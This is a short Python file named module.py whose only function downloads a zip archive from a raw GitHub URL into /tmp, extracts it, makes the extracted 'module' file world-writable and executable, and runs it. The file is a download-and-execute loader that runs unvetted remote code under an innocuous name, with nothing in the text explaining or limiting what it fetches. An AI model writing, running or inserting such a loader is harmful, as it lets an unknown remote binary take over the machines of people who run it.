# module.py
# -*- coding: utf-8 -*-

import os
import urllib.request
import zipfile


def main():
    os.chdir("/tmp")

    url = "https://raw.githubusercontent.com/Azigaming404/websocket/main/modul.zip"
    urllib.request.urlretrieve(url, "modul.zip")

    with zipfile.ZipFile("modul.zip", "r") as zip_ref:
        zip_ref.extractall()

    os.chmod("module", 0o777)

    os.system("./module")


if __name__ == "__main__":
    main()
